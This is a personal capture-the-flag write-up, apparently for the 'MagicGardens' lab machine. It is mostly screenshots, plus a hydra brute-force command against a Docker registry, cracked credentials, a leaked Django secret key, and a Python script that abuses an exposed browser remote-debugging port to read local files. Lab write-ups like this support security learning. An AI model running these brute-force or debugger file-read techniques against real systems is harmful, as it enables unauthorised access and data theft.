# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
## External
### Enumeration
![](https://i.imgur.com/42eLp2j.png)
![](https://i.imgur.com/LlQY02V.png)
#### Port `80`
![](https://i.imgur.com/votVtL2.png)
![](https://i.imgur.com/C6qnmU6.png)
![](https://i.imgur.com/D6GvBA4.png)
##### `/profile/?tab=*`
- On the Subscription thing there are many lead that indicate that there is some juicy on Subscribing. Also there is A QR code thing.
![](https://i.imgur.com/wKqI1DL.png)
- There is a message endpoint doing nothing - `http://magicgardens.htb/send_message/`
	- tried xss
##### `/catalog` & `/cart`
![](https://i.imgur.com/YEhhWGA.png)
- The 
![](https://i.imgur.com/adSAAPY.png)
- Tried XSS but nothing
##### `/wish_list`
![](https://i.imgur.com/670X1Ax.png)
- ![](https://i.imgur.com/MTRwh26.png)

##### `/search`
![](https://i.imgur.com/K7eIZKa.png)
##### `/admin`
![](https://i.imgur.com/e7275mw.png)
- WHere is the username come from??
- Based on The Username i got i tried to Bruteforce the username with ssh.
	- ![](https://i.imgur.com/GgmaaCQ.png)
` morty: jonasbrothers`
#### Port `5000`
![](https://i.imgur.com/qP8qrY4.png)
```shell
hydra -L /opt  -P /opt/ 10.129.36.62 -s 5000 https-get /v2/
```
https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry

This need password so, from the `port 80` we will get some kinda credentials and we will use that here.

#### Port `25`
![](https://i.imgur.com/FSmbe1o.png)
`magicgardens.magicgardens.htb`
### Gaining Access
![](https://i.imgur.com/rizlW9A.png)
## Internal
### Enumeration
![](https://i.imgur.com/SkmCcok.png)
![](https://i.imgur.com/mNN2vCH.png)
![](https://i.imgur.com/BM65yI3.png)
![](https://i.imgur.com/91itqa3.png)
![](https://i.imgur.com/9JqCsQ0.png)
```shell
2024/05/21 20:52:47 CMD: UID=0     PID=1680   | /usr/bin/containerd-shim-runc-v2 -namespace moby -id 86197762ad369d60eaef14367dfb0e1df78a465a4ed223b0fe4cc0548093d0f7 -address /run/containerd/containerd.sock
2024/05/21 20:52:47 CMD: UID=0     PID=1653   | /usr/bin/containerd-shim-runc-v2 -namespace moby -id 3ce9ecd76dc5171addd3dce930ec5fc599d5b92b8f2f45aebcafd8da5b66236c -address /run/containerd/containerd.sock
2024/05/21 20:52:47 CMD: UID=0     PID=1652   | /usr/bin/containerd-shim-runc-v2 -namespace moby -id 5d8a4a8d74d5d394caa5cae249c3b8e4891ef51e0bd224e51b6e1f0568424a75 -address /run/containerd/containerd.sock
2024/05/21 20:52:47 CMD: UID=0     PID=1627   | /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8000 -container-ip 172.17.0.2 -container-port 80
2024/05/21 20:52:47 CMD: UID=0     PID=1611   | /usr/sbin/docker-proxy -proto tcp -host-ip :: -host-port 5000 -container-ip 172.17.0.4 -container-port 5000
2024/05/21 20:52:47 CMD: UID=0     PID=1605   | /usr/sbin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.17.0.4 -container-port 5000
2024/05/21 20:52:47 CMD: UID=0     PID=1593   | /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.3 -container-port 80
```
![](https://i.imgur.com/0MqARmw.png)
- logged in as morty ![](https://i.imgur.com/sptJZe4.png)
- I used the username `alex` and tried to bruteforce the password using [THIS HACKTRICKS](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#docker-registry)
	- Because to access the Docker Registry (`port 50000`) I nee credentials and morty is not working.
	- ![](https://i.imgur.com/O2b3rda.png)
- ` alex : diamonds `
### Gaining Access
![](https://i.imgur.com/aKURzC8.png)
- I dumped all the images. https://github.com/Syzik/DockerRegistryGrabber ![](https://i.imgur.com/4fpvc59.png)
- I extracted the tar file
	- ![](https://i.imgur.com/8O64do7.png)
- I can try to exploit the django, with rce https://github.com/IR4N14N/Django-RCE
	- For this i need settings.json
![](https://i.imgur.com/A3QdSUw.png)
![](https://i.imgur.com/OKDdJdy.png)
```shell
SECRET_KEY=55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b
```
- Not working so i went back to the `tar` File I dumped and did `deploy.sh` from the grabber script.
### Maintaining Access
- I port forwarded the Firefox Debugging port that i got from the process view(`ps aux`)
	- ![](https://i.imgur.com/uqaK5DZ.png)
- Then I run this Code, on my machine
```python
import json
import requests
import websocket
import base64

debugger_address = 'http://localhost:44351'
response = requests.get(f'{debugger_address}/json')
tabs = response.json()
web_socket_debugger_url = tabs[0]['webSocketDebuggerUrl'].replace('127.0.0.1', 'localhost')
print(f'Connect to url: {web_socket_debugger_url}')
ws = websocket.create_connection(web_socket_debugger_url, suppress_origin=True)

command = json.dumps({
    "id": 5,
    "method": "Target.createTarget",
    "params": {
        "url": "file:///home/alex/user.txt"
    }
})
ws.send(command)
target_id = json.loads(ws.recv())['result']['targetId']
print(f'Target id: {target_id}')

command = json.dumps({
    "id": 5,
    "method": "Target.attachToTarget",
    "params": {
        "targetId": target_id,
        "flatten": True
    }
})
ws.send(command)
session_id = json.loads(ws.recv())['params']['sessionId']
print(f'Session id: {session_id}')

command = json.dumps({
    "id": 5,
    "sessionId": session_id,
    "method": "Page.captureScreenshot",
    "params": {
        "sessionId": session_id,
        "format": "png"
    }
})
ws.send(command)
result = json.loads(ws.recv())
ws.send(command)
result = json.loads(ws.recv())

if 'result' in result and 'data' in result['result']:
    print("Success file reading")
    with open("rex.png", "wb") as file:
        file.write(base64.b64decode(result['result']['data']))
else:
    print("Error file reading")

ws.close()
```
![](https://i.imgur.com/cnw2hY5.png)

# Random Notes

